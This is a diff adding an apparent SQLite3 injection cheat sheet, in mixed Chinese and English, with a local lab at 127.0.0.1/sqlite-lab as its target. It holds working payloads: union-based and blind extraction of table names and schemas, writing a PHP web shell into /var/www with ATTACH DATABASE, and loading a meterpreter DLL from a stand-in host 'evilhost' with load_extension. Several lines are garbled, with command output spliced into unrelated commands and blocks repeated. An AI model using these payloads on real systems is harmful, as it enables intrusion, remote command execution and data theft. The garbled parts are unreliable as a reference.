@@ -1,0 +1,270 @@
+SQLite3 Injection Cheat Sheet
+
+ Comments	 --
+
+ IF 语句	 CASE
+
+ Concatenation	 ||
+
+ Substring	 substr(x,y,z)
+
+ 获取字段长度	 length(stuff)
+
+ 生成单引号	 select substr(quote(hex(0)),1,1);
+
+ 生成双引号	 select cast(X'22' as text);
+
+ 生成双引号  .. VALUES (“<?xml version=“||””””||1||
+
+ sqlite> select replace("<?xml version=$1.0$>","$",(select cast(X'22' as text)));
+ <?xml version="1.0">	替换$符号为双引号
+
+ 向数据库中写入一句话
+ ?id=bob’; ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<? system($_GET[‘cmd’]); ?>");--
+ 
+ 通过SMB远程加载加载一个自定义库
+ ?name=123 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+
+ sqlite> PRAGMA database_list; - 显示附加数据库的信息，包括文件系统上的位置。
+ 0|main|
+ 2|lol|/var/www/lol.php
+
+ PRAGMA temp_store_directory ='/ filepath'; - 为临时文件设置目录，但不建议使用。
+ 
+ 查看数据库中的表结构
+ sqlite> .schema
+ CREATE TABLE lol.pwn(data text);
+
+ 打开一个已经创建的数据库,如该不存在将会创建
+ sqlite3  test.db
+
+ 删除一张数据表
+ drop table table_name;
+ 
+ 查看当前连接的数据库
+ .database
+ main: /var/www/lol.php
+ 
+ 删除指表中的数据
+ delete from table_name;
+
+ 导入一个文件中的内容导某个表中
+ .shell在系统shell中运行命令
+ .shell uname -a
+Linux kali 4.14.0-kali1-amd64 #1 SMP Debian 4.14.2-1kali1 (2017-12-04) x86_64 GNU/Linux from /root/test.py table_name
+
+ 设置文件字段的分隔符
+ .separator ":"
+ .shell在系统shell中运行命令
+ .shell uname -a
+Linux kali 4.14.0-kali1-amd64 #1 SMP Debian 4.14.2-1kali1 (2017-12-04) x86_64 GNU/Linux from /root/test.py table_name
+
+ 查看当前字段的分隔符
+ sqlite> .show
+        echo: off
+         eqp: off
+     explain: auto
+     headers: off
+        mode: list
+   nullvalue: ""
+      output: stdout
+colseparator: "^"	列分隔符
+rowseparator: "\n     行分隔符
+       stats: off
+       width: 
+    filename: :memory:
+
+ 查询时输出详细状态信息
+ .stats on/off
+ 
+ 将查询结果导出到一个文件
+ sqlite> .output /root/sqlite_output.txt
+ sqlite> select * from pwn;-- 执行要导出的sql语句
+ sqlite> .output stdout
+
+ 退出sqlite3
+ .exit
+ .quit
+
+ 建立索引
+ create index index_name on table_name(要创建索引的字段名);
+
+ oder by(判断字段)
+ select * from table_name order by 1;
+
+ like模糊查询
+ select * from where 列名 like 'hack%';-- 返回所有包含hack的数据
+
+ limit限制查询返回的列数
+ select * from table_name limit 5;
+
+ desc排序输出
+ select * from table_name order by col_name desc limit 10;
+
+ where条件查询
+ select * from table_name where id=1;
+
+ count()查询id大于2的用户有多少个
+ select count(*) from table_name where id > 2;
+
+ update更新修改数据(将字段name的值csrf更新为xss)
+ update table_name set name='xss' where name='csrf';
+
+ delete删除数据
+ delete from table_name where col_name = 'name';
+
+ 输出html
+ sqlite3 -html /var/www/lol.php "select * from pwn;" > 1.html
+
+ dump数据库
+ sqlite3 /var/www/lol.php ".dump" > output.sql
+
+ 以SQL文本格式转储数据库
+ .dump
+
+ 导入dump导出的数据
+ sqlite3 /var/www/lol.php < output.sql
+ 
+ .shell和.system 在系统shell中运行命令
+ .shell uname -a
+ Linux kalsqlite3 /var/www/lol.php "select *from pwn;"i 4.14.0-kali1-amd64 #1 SMP Debian 4.14.2-1kali1 (2017-12-04) x86_64 GNU/Linux
+ 
+ 直接在shell/dos中执行sqlite命令
+ sqlite3 /var/www/lol.php "select *from pwn;"
+
+ sqlite> .schema sqlite_master
+ CREATE TABLE sqlite_master (
+   type text,
+   name text,
+   tbl_name text,
+   rootpage integer,
+   sql text
+ );
+
+ 2、盲注
+select * from test where id =1 union select 1,length(sqlite_version())=6    //得到sqlite版本位数
+
+select * from test where id =1 and substr(sqlite_version(),1,1)='3'     //得到sqlite版本首位为3
+
+select * from test where id =1 and substr((select name from sqlite_master where type='table' limit 0,1),1,1)='T'  (大小写区分，有差别)  //得到sqlite表名第一位为T
+e
+3、Getshell
+select * from test where id =1 ;ATTACH DATABASE 'C:\\Sqlite\\xiaozi.php' AS pwn ; CREATE TABLE pwn.exp (dataz text) ; INSERT INTO pwn.exp (dataz) VALUES (' <?php phpinfo(); ?> '); --
+
+
+SELECT * from info where Tag = '".trim($_GET['tag'])."';
+
+SELECT * from info where number = ".trim($_GET['snumber']).";
+
+sqlite> SELECT * from info where number = 1337 union select 1,2,3,4,5;
+输出
+1|2|3|4|5
+
+sqlite> SELECT * from info where number = 1337 union SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';
+输出：
+1|info,users|3|4|5
+
+SELECT * from info where number = 1337 union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+
+sqlite> SELECT * from info where number = 1337 union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='info';
+1|CREATE TABLE "info" (
+	`number`	INTEGER PRIMARY KEY AUTOINCREMENT UNIQUE,
+	`OS`	TEXT,
+	`Server_IP`	TEXT,
+	`Price`	NUMERIC,
+	`Tag`	TEXT
+)|3|4|5
+
+
+SELECT * from info where number = 1337 union select 1,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~')
+
+SELECT * from info where number = 1337 union select 1,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='info';
+
+SELECT * from info where number = 1337 union SELECT 1,OS,3,4,5 FROM info
+
+SELECT * from info where number = 1337 union SELECT 1,group_concat(OS,'~~'),3,4,5 FROM info
+
+SELECT * from info where Tag = 'x' union select 1,2,3,4,5 FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%';
+
+http://127.0.0.1/sqlite-lab/index.php?tag=ubuntu' union select 1,2,3,4,5
+FROM sqlite_master WHERE type IN ('table','view') AND name NOT
+LIKE 'sqlite_%' -- -
+
+Paload for numeric SQLI
+paramater=value and 2 < 3--
+Payload for string based SQLI
+paramater=value' and 2 < 3-- -
+paramater=value) and 2 < 3-- -
+paramater=value') and 2 < 3-- -
+
+paramater=value) and 2 < 3-- -
+So, payload will be injected in between value) and -- -
+paramater=value) put_your_payload_here-- -
+
+and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
+判断表数量
+and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < 5
+
+http://127.0.0.1/sqlite-lab/index.php
+POST request data
+tag=ubuntu' and (SELECT count(tbl_name) FROM sqlite_master WHERE
+type='table' and tbl_name NOT like 'sqlite_%' ) < 5 -- - search=Check+Plan
+
+http://127.0.0.1/sqlite-lab/index.php
+POST body data
+tag=ubuntu' and (SELECT count(tbl_name) FROM sqlite_master WHERE
+type='table' and tbl_name NOT like 'sqlite_%' ) =2 -- -
+&search=Check+Plan
+
+and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table'
+and tbl_name not like 'sqlite_%' limit 1 offset 0)
+=table_name_length_number
+
+and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table'
+and tbl_name NOT like 'sqlite_%' limit 1 offset 0) < 6
+
+and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table'
+and tbl_name NOT like 'sqlite_%' limit 2 offset 1) =
+table_name_length_number
+
+and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE
+type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('some_char')
+
+http://127.0.0.1/sqlite-lab/index.php
+POST body data
+tag=ubuntu' and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master
+WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('k')-- -&search=Check+Plan
+
+SELECT * from info where Tag = '".trim($_GET['tag'])."';
+
+SELECT * from info where number = ".trim($_GET['snumber']).";
+SELECT * from info where number = 6 union select 1,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'`')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~'),3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' and name='info';
+
+sqlite> SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1;
+输出：
+users
+
+limit 2 限制显示2条
+offset 1; 只显示1条
+
+SELECT * FROM trom_data LIMIT nNumRecord OFFSET nBaseRow
+表示从第nBaseRow行(基于0的索引)(包括该行)开始,取其后的nNumRecord条记录
+
+sqlite> SELECT tbl_name FROM sqlite_master WHERE type='table';
+输出:
+sqlite_sequence
+info
+users
+
+模糊匹配，不显示以sqlite_开头的表，sqlite_开头的是系统内置表
+sqlite> SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';
+输出:
+info
+users
+
+
+sqlite> SELECT * from info where number=1227 union SELECT 1,sql,3,4,5 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='info';-- -获取info表中的列名
+
+sqlite> SELECT * from info where number=1337 union SELECT 1,tbl_name,3,4,5 FROM sqlite_master where type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1;-- -获取表名
